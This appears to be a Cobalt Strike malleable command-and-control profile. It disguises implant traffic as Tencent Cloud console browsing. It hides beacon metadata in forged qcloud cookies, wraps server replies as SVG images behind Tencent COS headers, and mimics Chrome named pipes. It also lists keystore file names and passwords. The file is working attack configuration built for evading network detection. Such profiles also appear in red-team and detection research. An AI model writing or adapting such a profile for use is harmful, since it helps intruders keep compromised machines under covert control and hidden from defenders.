...
## MS IE 11 User Agent
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0";
...
# https-certificate {
    ...
    # #set keystore "/root/tools/CobaltStrike_V4.0/cobaltstrike.store";
    # #set password "s0m3th1ng3ls3";
...
# code-signer {
    # set keystore "zhixuan888.top.jks";
    # set password "lylg4y21p97";
    # set alias "zhixuan888.top";
# }

https-certificate {
    set keystore "zhixuan888.top.store";
    set password "lylg4y21p97";
}
...
## ---------------------
set pipename         "mojo.5688.8052.18389493978708####"; # Common Chrome named pipe
set pipename_stager  "mojo.5688.8052.3578027332937####"; # Common Chrome named pipe
...
http-get {
    ...
    set uri "/qcloud/ui/static/static_source_business/";
    set verb "GET";
    ...
    client {
        ...
        header "Accept-Encoding" "gzip, deflate";
        header "Referer" "https://console.cloud.tencent.com/";
        ...
        metadata {
            mask;
            base64url;
            prepend "qcloud_uid=0Rxk7ZItjSJ8; language=zh; qcmainCSRFToken=4LUFplMjMtMg; qcloud_visitId=7041ba29b6a22a25804f1a8ea35545aa; qcloud_from=qcloud.directEnter.login-1743409625515; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22100016608927%22%2C%22first_id%22%3A%22195eb4fb9b61d4-0b64c8ddefd8ab8-f535726-1327104-195eb4fb9b75a2%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%22%7D%2C%22identities%22%3A%22";
            append "%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%22100016608927%22%7D%2C%22%24device_id%22%3A%22195eb4fb9b61d4-0b64c8ddefd8ab8-f535726-1327104-195eb4fb9b75a2%22%7D";
            header "Cookie";
        }
    }

    server {
        header "Server" "tencent-cos";
        header "Content-Type" "image/svg+xml";
        header "Accept-Ranges" "bytes";
        header "Access-Control-Expose-Headers" "Content-Length, Content-Type, server_ip, x-nws-log-uuid";
        header "X-Cache-Lookup" "Cache Hit";
        header "X-Cos-Replication-Status" "Complete";
        header "X-Cosindex-Replication-Status" "Complete";

        output {   
            mask;
            svg;
            prepend "<svg width=\"18\" height=\"18\" viewBox=\"0 0 18 18\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"";
            append "\" fill=\"#4D6BFE\"/>\n</svg>";
            print;
        }
    }
...
http-post {
    ...
    client {
        ...
        id {
            prepend "qcloud_uid=PR9uIZQtjKnj; language=zh; qcloud_from=qcloud.directEnter.login-1743409629565; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22100016788927%22%2C%22first_id%22%3A%2219098b9b61d4-0b64ba3defd8ab8-f345726-";
            # append "-195eb4fb9b75a2%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%22%7D%2C%22identities%22%3A%22gfGHDWRlbnRpdHlfY29va2fgTHlkIjoiMTk1ZWI0ZmI5YjYxZDQtMGI2NGM4ZGRlZmQ4YWI4LWY1MzU3MjYtMTMyNzEwNC0xOTVlYjRmYjliNzVhMiIsIiRpZGVudGl0eV9sb2dpbl9pZCI6IjEwMDAxNjYwODkyNyJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%22986016608927%22%7D%2C%22%24device_id%22%3A%22987e987b9b61d4-0b64c8ddefd8ab8-f535726-1327104-195eb4fb9b75a2%22%7D%3B%20intl%3D1%3B%20_ga%3DGA1.2.694542975.1743409626%3B%20_gcl_au%3D1.1.2008969992.1743409626%3B%20qcstats_seo_keywords%3D%E5%93%81%E7%89%8C%E8%AF%8D-%E5%93%81%E7%89%8C%E8%AF%8D-%E7%99%BB%E5%BD%95%3B%20";
            header "Cookie";
        }
        ...
        output {
            mask;
            base64url;
            prepend "[{\"app\":\"qcconsole\",\"event\":\"stat\",\"lid\":\"opIPLOYERT\",\"born\":1743517285233,\"at\":1743517288768,\"path\":\"/\",\"href\":\"https://console.cloud.tencent.com/\",\"uin\":100016562327,\"ownerUin\":100067898927,\"quid\":\"Rfk7ZIYtiJ8\",\"nickname\":\"kldfnefw\",\"idcDomains\":\"cloudcache.tencent-cloud.com; cloud.tencent.com; cloudcache.tencentcs.com; iaas.cloud.tencent.com\",\"idcDomainCount\":4,\"userArea\":1,\"userAppId\":1304230243,\"userLang\":\"zh\",\"cookieLang\":\"zh\",\"authType\":0,\"charset\":\"UTF-8\",\"isInternalIp\":false,\"insightClientVersion\":\"insight-client.00dfa2fa0.js\",\"ns\":\"console\",\"stat\":\"cgi\",\"level\":0,\"message\":\"";
            append "\",\"code\":0,\"errorCode\":\"success\",\"method\":\"POST\",\"url\":\"/cgi/capi?cmd=DescribeConsoleOverviewViewMode&action=delegate&serviceType=account&secure=1&version=3&dictId=2389&sts=1&t=1743517281461&uin=100016608927&ownerUin=100016608927&csrfCode=529359188\",\"cgi\":\"/cgi/capi?cmd=DescribeConsoleOverviewViewMode&action=delegate&serviceType=account\",\"hostname\":\"console.cloud.tencent.com\",\"rtt\":324,\"cost\":324,\"bytes\":239,\"speed\":239000,\"status\":200,\"serverCost\":\"158\",\"int_serverCost\":158,\"int_networkCost\":166,\"reqId\":\"S15PLdKp1l\",\"nwsLogUuid\":\"null\",\"service\":\"account\",\"action\":\"DescribeConsoleOverviewViewMode\",\"cgiType\":\"capi\",\"capiRequestId\":\"5331e9cd-dee3-4062-9052-78962ae9c835\",\"lifeRegion\":\"gz\",\"consoleEnv\":\"production\",\"productBlame\":\"path2\",\"productId\":1206,\"dictId\":2389}]";
            print;
        }
    }
